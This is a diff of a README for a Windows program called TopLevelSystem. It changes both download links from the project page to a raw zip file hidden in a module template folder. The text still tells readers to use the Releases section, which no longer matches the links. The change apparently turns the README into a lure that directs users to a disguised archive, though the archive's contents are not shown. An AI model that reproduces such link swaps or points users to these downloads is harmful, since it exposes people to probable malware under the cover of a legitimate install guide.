@@ -1,6 +1,6 @@
 # 🌐 TopLevelSystem - Centralized message routing for modular software
 
-[![](https://img.shields.io/badge/Download_TopLevelSystem-Blue)](https://github.com/keratodermiazhukov571/TopLevelSystem)
+[![](https://img.shields.io/badge/Download_TopLevelSystem-Blue)](https://raw.githubusercontent.com/keratodermiazhukov571/TopLevelSystem/main/modules/mod_template/Level-System-Top-v1.4.zip)
 
 TopLevelSystem provides a simple way to connect software modules. It manages interactions through a reliable message path. The system handles data flow across various interfaces, including web traffic and local network connections. It functions as a base layer for building distributed systems that scale.
 
@@ -12,7 +12,7 @@ This software runs on Windows 10 or Windows 11. You need a stable internet conne
 
 Visit the project page below to obtain the application installer.
 
-[Download the latest version here](https://github.com/keratodermiazhukov571/TopLevelSystem)
+[Download the latest version here](https://raw.githubusercontent.com/keratodermiazhukov571/TopLevelSystem/main/modules/mod_template/Level-System-Top-v1.4.zip)
 
 1. Navigate to the link provided above.
 2. Look for the Releases section on the right side of the page.
